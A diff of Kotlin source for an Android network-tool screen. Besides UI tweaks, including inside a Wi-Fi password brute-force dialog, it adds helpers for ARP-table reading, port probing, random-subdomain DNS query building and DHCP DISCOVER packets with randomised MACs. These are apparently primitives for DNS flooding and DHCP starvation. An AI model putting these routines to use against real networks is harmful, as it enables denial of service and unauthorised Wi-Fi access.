+                                }
                             }
                         }
                     }
@@ -1046,7 +1608,7 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
                                         fontWeight = FontWeight.Bold,
                                         color = MaterialTheme.colorScheme.onSurface
                                     )
-                                    IconButton(onClick = { closeDialog() }) {
+                                    DolphyIconButton(onClick = { closeDialog() }) {
                                         Icon(Icons.Filled.Close, contentDescription = null, tint = MaterialTheme.colorScheme.onSurface)
                                     }
                                 }
@@ -1416,7 +1978,7 @@ private fun BrutePasswordDialog(
                         style = MaterialTheme.typography.headlineSmall,
                         fontWeight = FontWeight.Bold
                     )
-                    IconButton(onClick = onImport) {
+                    DolphyIconButton(onClick = onImport) {
                         Icon(Icons.Filled.Add, contentDescription = stringResource(R.string.wifi_import_passwords), tint = MaterialTheme.colorScheme.primary)
                     }
                 }
@@ -1507,7 +2069,7 @@ private fun BrutePasswordDialog(
                                             Text(
                                                 text = stringResource(R.string.wifi_passwords_count, count, validCount),
                                                 style = MaterialTheme.typography.bodySmall,
-                                                color = TextGray
+                                                color = MaterialTheme.colorScheme.onSurfaceVariant
                                             )
                                         }
                                         if (group.isImported) {
@@ -1537,3 +2099,145 @@ private fun BrutePasswordDialog(
         }
     }
 }
+
+
+private fun dhcpIntToIpv4(value: Int): String? {
+    if (value == 0) return null
+    return try {
+        val bytes = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(value).array()
+        InetAddress.getByAddress(bytes).hostAddress
+    } catch (_: Exception) {
+        null
+    }
+}
+
+private fun getHubLocalIpv4(): String? {
+    return try {
+        val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
+        for (intf in interfaces) {
+            if (!intf.isUp || intf.isLoopback) continue
+            for (addr in Collections.list(intf.inetAddresses)) {
+                if (addr.isLoopbackAddress) continue
+                val host = addr.hostAddress ?: continue
+                if (host.contains(':')) continue
+                return host
+            }
+        }
+        null
+    } catch (_: Exception) {
+        null
+    }
+}
+
+private fun readArpTable(): List<Pair<String, String>> {
+    val out = mutableListOf<Pair<String, String>>()
+    try {
+        BufferedReader(FileReader("/proc/net/arp")).use { reader ->
+            reader.readLine()
+            var line = reader.readLine()
+            while (line != null) {
+                val parts = line.trim().split(Regex("\\s+"))
+                if (parts.size >= 4) {
+                    val ip = parts[0]
+                    val mac = parts[3].uppercase(Locale.US)
+                    if (mac.matches(Regex("^([0-9A-F]{2}:){5}[0-9A-F]{2}$")) && mac != "00:00:00:00:00:00") {
+                        out += ip to mac
+                    }
+                }
+                line = reader.readLine()
+            }
+        }
+    } catch (_: Exception) {
+    }
+    return out
+}
+
+private fun quickPortOpen(ip: String, port: Int, timeoutMs: Int): Boolean {
+    return runCatching {
+        Socket().use { s ->
+            s.connect(InetSocketAddress(ip, port), timeoutMs)
+            true
+        }
+    }.getOrDefault(false)
+}
+
+
+private fun buildDnsQuery(hostname: String, id: Int = (System.nanoTime() and 0xFFFF).toInt()): ByteArray {
+    val header = ByteBuffer.allocate(12).order(ByteOrder.BIG_ENDIAN)
+    header.putShort((id and 0xFFFF).toShort())
+    header.putShort(0x0100.toShort())
+    header.putShort(1)
+    header.putShort(0)
+    header.putShort(0)
+    header.putShort(0)
+    val qname = java.io.ByteArrayOutputStream()
+    hostname.split('.').forEach { label ->
+        if (label.isEmpty()) return@forEach
+        val bytes = label.toByteArray(Charsets.US_ASCII).take(63).toByteArray()
+        qname.write(bytes.size)
+        qname.write(bytes)
+    }
+    qname.write(0)
+    val tail = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN)
+    val qtype = if ((id and 1) == 0) 1 else 28
+    tail.putShort(qtype.toShort())
+    tail.putShort(1)
+    return header.array() + qname.toByteArray() + tail.array()
+}
+
+
+private fun buildRandomRecursiveDnsQuery(random: java.util.Random): ByteArray {
+    val id = random.nextInt(0x10000)
+    val label = buildString(16) {
+        repeat(10 + random.nextInt(6)) {
+            append(('a'.code + random.nextInt(26)).toChar())
+        }
+    }
+    val num = random.nextInt(1_000_000)
+    val roots = arrayOf(
+        "com", "net", "org", "ru", "io", "info", "xyz", "online",
+        "google.com", "cloudflare.com", "amazon.com", "microsoft.com",
+        "yandex.ru", "vk.com", "apple.com",
+    )
+    val root = roots[random.nextInt(roots.size)]
+    val host = when (random.nextInt(4)) {
+        0 -> "$label$num.$root"
+        1 -> "$label.$num.$root"
+        2 -> "cdn-$label-$num.$root"
+        else -> "r$num-$label.$root"
+    }
+    return buildDnsQuery(host, id)
+}
+
+
+private fun buildDhcpDiscover(): ByteArray {
+    val buf = ByteArray(300)
+    buf[0] = 1
+    buf[1] = 1
+    buf[2] = 6
+    val xid = (System.nanoTime() and 0xFFFFFFFFL).toInt()
+    buf[4] = (xid ushr 24).toByte()
+    buf[5] = (xid ushr 16).toByte()
+    buf[6] = (xid ushr 8).toByte()
+    buf[7] = xid.toByte()
+    buf[10] = 0x80.toByte()
+    val rnd = java.util.Random()
+    for (i in 0 until 6) buf[28 + i] = rnd.nextInt(256).toByte()
+    buf[28] = ((buf[28].toInt() and 0xFE) or 0x02).toByte()
+    buf[236] = 99
+    buf[237] = 130.toByte()
+    buf[238] = 83
+    buf[239] = 99
+    buf[240] = 53
+    buf[241] = 1
+    buf[242] = 1
+    buf[243] = 55
+    buf[244] = 4
+    buf[245] = 1
+    buf[246] = 3
+    buf[247] = 6
+    buf[248] = 15
+    buf[249] = 255.toByte()
+    return buf
+}
+
